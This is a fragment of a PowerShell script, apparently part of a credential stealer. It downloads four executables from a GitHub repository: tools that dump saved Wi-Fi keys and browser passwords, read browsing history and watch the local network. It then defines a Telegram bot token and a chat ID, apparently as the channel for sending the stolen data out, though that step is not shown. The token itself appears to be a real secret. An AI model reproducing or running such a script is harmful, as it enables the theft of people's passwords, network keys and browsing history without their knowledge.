...
Invoke-WebRequest https://github.com/Bakri-l/ProjekElangMerah/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/Bakri-l/ProjekElangMerah/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/Bakri-l/ProjekElangMerah/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/Bakri-l/ProjekElangMerah/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
...
$token = "7817825579:AAF3YJ8qhGHPA9gx27nxVc9oHaPPltipv8w"
$chatID = "1092328106"
